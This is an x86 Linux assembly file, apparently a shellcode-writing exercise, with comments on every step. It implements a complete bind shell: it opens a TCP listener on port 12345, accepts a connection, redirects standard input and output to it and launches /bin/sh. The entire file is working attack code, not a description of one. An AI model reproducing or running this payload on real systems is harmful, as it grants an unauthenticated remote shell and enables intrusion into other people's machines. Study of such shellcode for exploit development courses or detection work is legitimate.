global _start

section       .text
_start:

; create socket(AF_INET, SOCK_STREAM, 0) - values are taken from man page
; push arguments to stack, then make socketcall
        xor eax, eax    ;clear eax
        xor ebx, ebx    ;clear ebx
        push ebx        ;push 0 to stack - protocol value
        push byte 1     ;push SOCK_STREAM to stack - value is 1
        push byte 2     ;push AF_INET to stack - value is 2
        mov ecx, esp    ;top of stack points to arguments, this needs to go to ecx

        mov al, 102     ;eax contains code for socketcall
        mov bl, 1       ;ebx contains code for SYS_SOCKET
        int 0x80        ;make the call
        mov edi, eax    ;store socket to edi since we need eax for future syscalls


; bind(fd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr))
; push arguments of sockaddr structure first
        xor eax, eax    ;clear eax
        push eax        ;listen on all interfaces, INADDR_ANY - value is 0
        push word 0x3930;push port 12345
        push word 2     ;push AF_INET - value is 2
        mov ebx, esp    ;top of stack points to sockaddr, put it into ebx

; now push bind arguments to stack, then make socketcall
        push byte 16    ;sockaddr length is 16
        push ebx        ;push pointer to sockaddrs
        push edi        ;push fd

        xor ebx, ebx    ;clear ebx
        mov al, 102     ;eax contains code for socketcall
        mov bl, 2       ;ebx contains code for SYS_BIND
        mov ecx, esp    ;top of stack points to arguments, this needs to go to ecx
        int 0x80        ;make the call


; listen(fd,0)
; push arguments for listen on stack, then make socketcall
        xor eax, eax    ;clear eax
        xor ebx, ebx    ;clear ebx
        push ebx        ;push backlog value to stack, should be set to 0
        push edi        ;push fd

        mov al, 102     ;eax contains code for socketcall
        mov bl, 4       ;ebx contains code for SYS_LISTEN
        mov ecx, esp    ;top of stack points to arguments, this needs to go to ecx
        int 0x80        ;make the call


; connfd = accept(fd, NULL, NULL)
; push arguments of accept to stack, then make socketcall
        xor eax, eax    ;clear eax
        xor ebx, ebx    ;clear ebx
        push ebx        ;push NULL
        push ebx        ;push NULL
	push edi	;push fd

        mov al, 102     ;eax contains code for socketcall
        mov bl, 5       ;ebx contains code for SYS_ACCEPT
        mov ecx, esp    ;top of stack points to arguments, this needs to go to ecx
        int 0x80        ;make the call

; now create duplicates for stdin, stdout and stderr for shell
; dup2(connfd, 0) 
; dup2(connfd, 1)
; dup2(connfd, 2)
; we will use loop in order to minimize code length
        mov ebx, eax	;fd is in eax, it needs to be the first argument for dup2 syscall
        xor ecx, ecx	;clear ecx
        mov cl, 2       ;start with stderr as a second argument (value 2), then stdout (1), then stdin (0)
	
	xor eax,eax	;clear eax just in case

loop:
	mov al, 63	;setup dup2 syscall, this needs to be done every time since syscall stores return value in eax
	int 0x80	;make the call
        dec ecx		;decrease ecx value
	jns loop	;if the value is not signed (meaning not negative), continue looping

; execve("/bin/sh", NULL, NULL)
; push arguments and command string to stack and make the syscall
        xor eax,eax     ;clear eax
        push eax        ;push to stack for NULL termination of command string
        push 0x68732f2f ;push "hs//" to stack
        push 0x6e69622f ;push "nib/" to stack
        mov ebx, esp    ;top of stack points to command string, put it into ebx
        mov ecx, eax    ;fill first NULL argument for execve
        mov edx, eax    ;full second NULL argument for execve
        mov al, 11      ;prepare execve syscall
        int 0x80        ;make execve syscall = spawn shell

